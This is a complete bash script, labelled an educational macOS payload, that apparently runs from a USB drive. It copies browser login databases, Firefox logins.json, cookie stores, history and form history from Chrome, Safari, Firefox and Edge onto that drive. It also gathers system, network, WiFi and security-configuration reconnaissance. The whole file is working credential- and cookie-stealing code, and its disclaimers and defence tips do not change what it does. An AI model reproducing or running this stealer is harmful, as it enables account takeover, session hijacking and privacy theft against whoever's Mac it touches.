#!/bin/bash

# macOS Payload for Educational Cybersecurity Tool
# This bash script demonstrates common data extraction techniques
# for educational and authorized testing purposes only.

# Educational Purpose:
# - Shows how credentials might be extracted from browsers on macOS
# - Demonstrates system information gathering
# - Illustrates the importance of data-at-rest encryption
# - Teaches defense strategies against such attacks

# IMPORTANT: Only use on systems with explicit written permission!

# Set strict error handling
set -euo pipefail

# Configuration
OUTPUT_PATH="/Volumes/TRUSTED_DRIVE"
VERBOSE=false

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -o|--output)
            OUTPUT_PATH="$2"
            shift 2
            ;;
        -h|--help)
            echo "Usage: $0 [-v|--verbose] [-o|--output PATH]"
            echo "Educational macOS data extraction tool"
            echo "AUTHORIZED USE ONLY!"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Educational disclaimer
echo "=== EDUCATIONAL CYBERSECURITY DEMONSTRATION ==="
echo "This script is for authorized testing and education only!"
echo "Ensure you have explicit permission before running!"
echo

# Logging function
log_message() {
    local level="$1"
    local message="$2"
    
    if [[ "$level" == "VERBOSE" && "$VERBOSE" != true ]]; then
        return
    fi
    
    echo "[$level] $(date '+%Y-%m-%d %H:%M:%S'): $message"
}

# Safe directory creation
create_safe_directory() {
    local dir_path="$1"
    
    if [[ ! -d "$dir_path" ]]; then
        if mkdir -p "$dir_path" 2>/dev/null; then
            log_message "VERBOSE" "Created directory: $dir_path"
            return 0
        else
            log_message "WARNING" "Failed to create directory: $dir_path"
            return 1
        fi
    fi
    return 0
}

# Safe file copy function
copy_safe_file() {
    local source="$1"
    local destination="$2"
    local description="$3"
    
    if [[ -f "$source" ]]; then
        if cp "$source" "$destination" 2>/dev/null; then
            log_message "VERBOSE" "Copied $description from $source"
            return 0
        else
            log_message "WARNING" "Failed to copy $description: Permission denied or file locked"
            return 1
        fi
    else
        log_message "INFO" "$description not found at $source"
        return 1
    fi
}

# Main execution function
main() {
    log_message "INFO" "Starting macOS data extraction demonstration..."
    
    # Check if output path exists (should be mounted USB drive)
    if [[ ! -d "$OUTPUT_PATH" ]]; then
        log_message "ERROR" "Output path does not exist: $OUTPUT_PATH"
        log_message "ERROR" "Please ensure the USB drive is properly mounted"
        exit 1
    fi
    
    # Create directory structure
    local chrome_dir="$OUTPUT_PATH/chrome"
    local safari_dir="$OUTPUT_PATH/safari"
    local firefox_dir="$OUTPUT_PATH/firefox"
    local edge_dir="$OUTPUT_PATH/edge"
    local system_dir="$OUTPUT_PATH/system"
    
    create_safe_directory "$chrome_dir"
    create_safe_directory "$safari_dir"
    create_safe_directory "$firefox_dir"
    create_safe_directory "$edge_dir"
    create_safe_directory "$system_dir"
    
    # Educational note about browser data
    echo
    log_message "INFO" "EDUCATIONAL NOTE: Browser Data Extraction"
    echo "This demonstrates how browser credentials are stored locally and can be extracted."
    echo "Defense: Use Keychain Access restrictions, enable FileVault, regular security updates."
    echo
    
    # Chrome data extraction (educational demonstration)
    local chrome_path="$HOME/Library/Application Support/Google/Chrome/Default"
    if [[ -d "$chrome_path" ]]; then
        log_message "INFO" "Demonstrating Chrome data extraction..."
        
        # Note: Chrome on macOS stores passwords in Keychain, but local files still contain useful data
        copy_safe_file "$chrome_path/Login Data" "$chrome_dir/login_data.db" "Chrome login database"
        copy_safe_file "$chrome_path/Cookies" "$chrome_dir/cookies.db" "Chrome cookies database"
        copy_safe_file "$chrome_path/History" "$chrome_dir/history.db" "Chrome browsing history"
        copy_safe_file "$chrome_path/Bookmarks" "$chrome_dir/bookmarks.json" "Chrome bookmarks"
        copy_safe_file "$chrome_path/Preferences" "$chrome_dir/preferences.json" "Chrome preferences"
    else
        log_message "INFO" "Chrome not found or not installed"
    fi
    
    # Safari data extraction
    local safari_path="$HOME/Library/Safari"
    if [[ -d "$safari_path" ]]; then
        log_message "INFO" "Demonstrating Safari data extraction..."
        
        copy_safe_file "$safari_path/History.db" "$safari_dir/history.db" "Safari browsing history"
        copy_safe_file "$safari_path/Bookmarks.plist" "$safari_dir/bookmarks.plist" "Safari bookmarks"
        copy_safe_file "$safari_path/Downloads.plist" "$safari_dir/downloads.plist" "Safari downloads"
        copy_safe_file "$safari_path/TopSites.plist" "$safari_dir/topsites.plist" "Safari top sites"
        
        # Cookies are in a different location
        local safari_cookies="$HOME/Library/Cookies/Cookies.binarycookies"
        copy_safe_file "$safari_cookies" "$safari_dir/cookies.binarycookies" "Safari cookies"
    else
        log_message "INFO" "Safari data not found (may be restricted)"
    fi
    
    # Firefox data extraction
    local firefox_profiles="$HOME/Library/Application Support/Firefox/Profiles"
    if [[ -d "$firefox_profiles" ]]; then
        log_message "INFO" "Demonstrating Firefox data extraction..."
        
        for profile_dir in "$firefox_profiles"/*; do
            if [[ -d "$profile_dir" ]]; then
                local profile_name=$(basename "$profile_dir")
                log_message "VERBOSE" "Processing Firefox profile: $profile_name"
                
                copy_safe_file "$profile_dir/logins.json" "$firefox_dir/${profile_name}-logins.json" "Firefox logins"
                copy_safe_file "$profile_dir/cookies.sqlite" "$firefox_dir/${profile_name}-cookies.sqlite" "Firefox cookies"
                copy_safe_file "$profile_dir/places.sqlite" "$firefox_dir/${profile_name}-places.sqlite" "Firefox history/bookmarks"
                copy_safe_file "$profile_dir/formhistory.sqlite" "$firefox_dir/${profile_name}-formhistory.sqlite" "Firefox form history"
            fi
        done
    else
        log_message "INFO" "Firefox not found or not installed"
    fi
    
    # Microsoft Edge data extraction
    local edge_path="$HOME/Library/Application Support/Microsoft Edge/Default"
    if [[ -d "$edge_path" ]]; then
        log_message "INFO" "Demonstrating Edge data extraction..."
        
        copy_safe_file "$edge_path/Login Data" "$edge_dir/login_data.db" "Edge login database"
        copy_safe_file "$edge_path/Cookies" "$edge_dir/cookies.db" "Edge cookies database"
        copy_safe_file "$edge_path/History" "$edge_dir/history.db" "Edge browsing history"
        copy_safe_file "$edge_path/Bookmarks" "$edge_dir/bookmarks.json" "Edge bookmarks"
    else
        log_message "INFO" "Microsoft Edge not found or not installed"
    fi
    
    # Educational note about system information
    echo
    log_message "INFO" "EDUCATIONAL NOTE: System Information Gathering"
    echo "This demonstrates how system information can be gathered for reconnaissance."
    echo "Defense: Minimize information disclosure, use system hardening, monitor for reconnaissance."
    echo
    
    # System information collection
    log_message "INFO" "Gathering system information for educational analysis..."
    
    local system_info_file="$system_dir/system_info.txt"
    local network_info_file="$system_dir/network_info.txt"
    local security_info_file="$system_dir/security_info.txt"
    
    # Comprehensive system information
    {
        echo "=== EDUCATIONAL SYSTEM INFORMATION DEMONSTRATION ==="
        echo "Collection Time: $(date)"
        echo "Purpose: Cybersecurity education and authorized testing"
        echo
        echo "=== BASIC SYSTEM INFO ==="
        system_profiler SPSoftwareDataType SPHardwareDataType 2>/dev/null || echo "System profiler access restricted"
        
        echo
        echo "=== SYSTEM VERSION ==="
        sw_vers 2>/dev/null || echo "System version access restricted"
        
        echo
        echo "=== CURRENT USER INFO ==="
        echo "Username: $(whoami)"
        echo "User ID: $(id -u)"
        echo "Groups: $(groups)"
        echo "Home Directory: $HOME"
        
        echo
        echo "=== RUNNING PROCESSES ==="
        ps aux | head -20 2>/dev/null || echo "Process list access restricted"
        
        echo
        echo "=== INSTALLED APPLICATIONS ==="
        ls -la /Applications 2>/dev/null | head -20 || echo "Applications directory access restricted"
        
        echo
        echo "=== STARTUP ITEMS ==="
        launchctl list | head -20 2>/dev/null || echo "Launch control access restricted"
        
    } > "$system_info_file"
    
    # Network information
    {
        echo "=== NETWORK CONFIGURATION ==="
        ifconfig 2>/dev/null || echo "Network interface access restricted"
        
        echo
        echo "=== ROUTING TABLE ==="
        netstat -rn 2>/dev/null || echo "Routing table access restricted"
        
        echo
        echo "=== ACTIVE CONNECTIONS ==="
        netstat -an | head -20 2>/dev/null || echo "Network connections access restricted"
        
        echo
        echo "=== ARP TABLE ==="
        arp -a 2>/dev/null || echo "ARP table access restricted"
        
        echo
        echo "=== DNS CONFIGURATION ==="
        cat /etc/resolv.conf 2>/dev/null || echo "DNS configuration access restricted"
        
        echo
        echo "=== WIFI NETWORKS (if available) ==="
        /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null || echo "WiFi scan access restricted"
        
    } > "$network_info_file"
    
    # Security-relevant information
    {
        echo "=== SECURITY CONFIGURATION ==="
        
        echo "=== FILEVAULT STATUS ==="
        fdesetup status 2>/dev/null || echo "FileVault status access restricted"
        
        echo
        echo "=== FIREWALL STATUS ==="
        /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null || echo "Firewall status access restricted"
        
        echo
        echo "=== GATEKEEPER STATUS ==="
        spctl --status 2>/dev/null || echo "Gatekeeper status access restricted"
        
        echo
        echo "=== SIP STATUS ==="
        csrutil status 2>/dev/null || echo "SIP status access restricted"
        
        echo
        echo "=== KEYCHAIN INFO ==="
        security list-keychains 2>/dev/null || echo "Keychain access restricted"
        
        echo
        echo "=== PRIVACY DATABASE CHECKS ==="
        ls -la ~/Library/Application\ Support/com.apple.TCC/ 2>/dev/null || echo "TCC database access restricted"
        
    } > "$security_info_file"
    
    # Create comprehensive summary
    local summary_file="$OUTPUT_PATH/collection_summary.txt"
    {
        echo "=== EDUCATIONAL CYBERSECURITY TOOL - COLLECTION SUMMARY ==="
        echo
        echo "Collection Date: $(date)"
        echo "Target System: $(hostname)"
        echo "Current User: $(whoami)"
        echo "Tool Purpose: Educational demonstration of data extraction techniques"
        echo
        echo "IMPORTANT DISCLAIMER:"
        echo "This data was collected for educational purposes and authorized security testing."
        echo "Unauthorized use of this tool or its collected data is illegal and unethical."
        echo
        echo "Files Collected:"
        echo "- Browser databases (Chrome, Safari, Firefox, Edge)"
        echo "- System information and configuration"
        echo "- Network configuration"
        echo "- Security status information"
        echo
        echo "Educational Value:"
        echo "This demonstrates common attack vectors and highlights the importance of:"
        echo "1. FileVault full-disk encryption"
        echo "2. Keychain Access restrictions"
        echo "3. Application sandboxing"
        echo "4. System Integrity Protection (SIP)"
        echo "5. Privacy controls in System Preferences"
        echo "6. Regular security updates"
        echo "7. Endpoint detection and response (EDR)"
        echo "8. User security awareness training"
        echo
        echo "macOS-Specific Defenses Demonstrated:"
        echo "- Gatekeeper code signing verification"
        echo "- TCC (Transparency, Consent, and Control) privacy database"
        echo "- Sandboxing and entitlements"
        echo "- Keychain integration for credential storage"
        echo
        echo "Next Steps:"
        echo "1. Analyze collected data responsibly"
        echo "2. Document findings for educational purposes"
        echo "3. Implement appropriate security controls"
        echo "4. Share knowledge with security community (anonymized)"
        echo
        echo "=== END SUMMARY ==="
    } > "$summary_file"
    
    log_message "INFO" "Collection completed successfully!"
    log_message "INFO" "Summary written to: $summary_file"
    
    # Educational reminder
    echo
    log_message "WARNING" "REMEMBER: This tool is for education and authorized testing only!"
    log_message "WARNING" "Always ensure you have explicit permission before using on any system."
    echo
    
    log_message "INFO" "macOS payload demonstration completed."
}

# Trap for cleanup on exit
cleanup() {
    log_message "INFO" "Cleaning up temporary files..."
    # Add any cleanup code here if needed
}

trap cleanup EXIT

# Run main function
main "$@"